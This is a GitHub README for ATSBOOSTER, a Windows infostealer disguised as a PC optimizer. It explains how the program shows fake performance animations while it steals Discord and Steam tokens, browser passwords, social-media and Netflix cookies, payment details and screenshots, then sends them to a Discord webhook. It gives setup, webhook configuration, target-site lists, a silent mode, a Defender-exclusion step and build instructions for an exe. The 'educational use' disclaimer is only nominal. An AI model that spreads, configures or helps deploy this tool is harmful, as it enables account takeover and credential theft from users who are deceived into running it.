<div align="center">
  <br>
  <p>
    <img src="https://forthebadge.com/images/badges/made-with-python.svg">
    <img src="http://forthebadge.com/images/badges/built-with-love.svg">
  </p>
  <h1>ATSBOOSTER</h1>
  <p><strong>Token Grabber & Data Extractor for Windows</strong></p>
  <p>
    <img alt="GitHub contributors" src="https://img.shields.io/github/contributors/Dopiiii/ATSBOOSTER">
    <img alt="GitHub issues" src="https://img.shields.io/github/issues/Dopiiii/ATSBOOSTER">
    <img alt="GitHub pull requests" src="https://img.shields.io/github/issues-pr/Dopiiii/ATSBOOSTER">
    <img alt="GitHub commit activity" src="https://img.shields.io/github/commit-activity/m/Dopiiii/ATSBOOSTER">
    <img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=shields">
  </p>
  <p align="center">
    <a href="#overview">Overview</a> &bull;
    <a href="#features">Features</a> &bull;
    <a href="#installation">Installation</a> &bull;
    <a href="#usage">Usage</a> &bull;
    <a href="#configuration">Configuration</a> &bull;
    <a href="#build">Build</a> &bull;
    <a href="#compatibility">Compatibility</a> &bull;
    <a href="#disclaimer">Disclaimer</a> &bull;
    <a href="#license">License</a>
  </p>
</div>

---

# Overview

ATSBOOSTER is a Windows data extraction tool disguised as a PC optimization utility. It presents a fake system optimizer interface while silently collecting tokens, cookies, passwords, and system information from the target machine, then sending everything to a Discord webhook.

The tool uses a TUI (Text User Interface) with a menu offering "PC Boost", "Disable Optimization", and "Uninstall" options. When the user selects "Boost my PC", the program displays fake hardware analysis and performance scoring animations while extracting data in the background.

> **This tool does NOT bypass antivirus.** Windows Defender or any other AV will likely flag it. The program attempts to add itself to Defender's exclusion list, but this requires admin privileges and will not work against third-party antivirus software.

# Features

## Data Extraction

- **Discord Tokens** - Extracts tokens from Discord's leveldb storage across all Chromium-based browsers (Chrome, Edge, Brave, Opera, Vivaldi, Yandex, etc.) and Discord's local clients. Supports both plaintext and encrypted (v10/v11) token decryption via DPAPI.
- **Twitter Tokens** - Grabs `auth_token` cookies from all installed browsers.
- **Instagram Sessions** - Extracts `ds_user_id` and `sessionid` cookies for account access.
- **Netflix Cookies** - Full cookie extraction for Netflix account access.
- **Browser Passwords** - Decrypts saved passwords from Chrome, Edge, and Brave login databases using AES-GCM with DPAPI key extraction.
- **Steam Accounts & Tokens** - Extracts Steam account info (SteamID, AccountName, PersonaName) and tokens (RefreshToken, AccessToken, SSFN guard files) from Steam's config files.
- **Payment Info** - Checks Discord billing for credit cards and PayPal accounts.

## System Information Collected

- IP address, country, city (via multiple geo-IP APIs)
- MAC address
- HWID (Hardware UUID)
- CPU brand and clock speed
- RAM total
- Screen resolution
- OS platform
- Screenshot of the desktop
- Browser history (up to 200 entries)

## Delivery

- All collected data is packed into a ZIP file and sent to a Discord webhook with an embedded summary.
- The webhook message includes token previews, account counts, payment info status, and system info.

## Disguise

- Fake hardware detection (CPU, GPU, RAM, disks, motherboard, network)
- Fake performance analysis with animated steps
- Fake performance score (6.2/10 before, 9.4/10 after)
- Real (but minor) system optimizations applied via PowerShell to appear legitimate:
  - Disables hibernation, SysMain, DiagTrack, WSearch, print spooler
  - Sets Ultimate Performance power plan
  - Configures TCP settings and RSS
  - Disables NTFS LastAccess updates
  - Enables disk write-cache

# Installation

## Prerequisites

- **Windows 10/11** (x86, x86_64, arm64)
- **Python 3.9+**
- **Administrator privileges** required

## Steps

```bash
# 1. Clone the repository
git clone https://github.com/Dopiiii/ATSBOOSTER.git
cd ATSBOOSTER

# 2. Install dependencies
pip install -r requirements.txt

# 3. Configure your webhook (see Configuration section)

# 4. Run the program (as administrator)
python ATSBOOSTER.py
```

# Usage

On launch, the program requests admin privileges and displays:

```
  MENU PRINCIPAL

  [1] Booster mon PC           - Optimiser les performances
  [2] Desactiver l'optimisation - Revenir aux parametres par defaut
  [3] Supprimer ATSBOOSTER     - Desinstaller le programme
  [Q] Quitter
```

- **Option 1** - Triggers data extraction in a background thread while showing fake optimization animations. Data is sent to the configured webhook.
- **Option 2** - Reverts the system changes made by Option 1 (restores default power plan, re-enables services).
- **Option 3** - Reverts all changes, removes Defender exclusions, sends an uninstall notification to the webhook, and exits.
- **Q** - Quits the program.

You can also run the tool in silent mode (no TUI) by passing `--boost`:

```bash
python ATSBOOSTER.py --boost
```

This skips the menu and immediately extracts and sends data.

# Configuration

## Setting your webhook

Open `ATSBOOSTER.py` and modify line 49:

```python
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
```

Replace the URL with your own Discord webhook URL. To create one:
1. Open Discord > Server Settings > Integrations > Webhooks
2. Click "New Webhook"
3. Copy the webhook URL

## Modifying target websites

By default, the tool targets Discord, Twitter, Instagram, and Netflix. You can modify the `website` list on line 34:

```python
website = ["discord.com", "twitter.com", "instagram.com", "netflix.com"]
```

Add or remove domains as needed. Each domain is processed through the cookie grabber.

## Modifying the disguise

- **Banner**: Edit the `show_banner()` function (line 1179)
- **Menu**: Edit the `show_menu()` function (line 1195)
- **Fake scores**: Edit values in `simulate_analysis()` (line 1285) and `option_boost()` (line 1316)
- **Optimizations**: Edit `optimize_pc()` (line 1056) and `restore_pc()` (line 1090)

# Build

To compile into a standalone `.exe`:

```bash
# Method 1 - Python script
python build.py

# Method 2 - Batch file
build.bat
```

The `ATSBOOSTER.spec` file is provided for PyInstaller configuration.

> **Note:** The compiled executable will likely be flagged by antivirus software. This tool does not include any AV bypass mechanism.

# Compatibility

| Browser | Cookies & Tokens | Passwords |
|:--:|:--:|:--:|
| Chrome | ✅ | ✅ |
| Edge | ✅ | ✅ |
| Brave | ✅ | ✅ |
| Firefox | ✅ | ❌ |
| Opera (GX) | ✅ | ❌ |
| Vivaldi | ✅ | ❌ |
| Chromium | ✅ | ❌ |

| OS | Support |
|:--:|:-------:|
| Windows 10 | ✅ |
| Windows 11 | ✅ |
| Linux / macOS | ❌ |

# Disclaimer

> **WARNING: This tool is for personal and educational use ONLY.**
>
> - You must only use this tool on your own machines or with explicit permission from the owner.
> - Unauthorized use of this tool to access other people's accounts, tokens, or data is **illegal**.
> - This tool does **NOT** bypass antivirus software. It will be detected by Windows Defender and third-party AVs.
> - The author declines any responsibility for misuse of this code.
> - By using this tool, you accept full responsibility for your actions.

# Contributing

Contributions are welcome! Please read the [contribution guidelines](CONTRIBUTING.md) first.

## Authors

<a href="https://github.com/Dopiiii/ATSBOOSTER/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=Dopiiii/ATSBOOSTER" />
</a>
<br>
<br>

> **Working on your first Pull Request?** You can learn how from this *free* series [How to Contribute to an Open Source Project on GitHub](https://kcd.im/pull-request)

# License

This project is licensed under the terms of the [LICENSE](LICENSE.md) file.
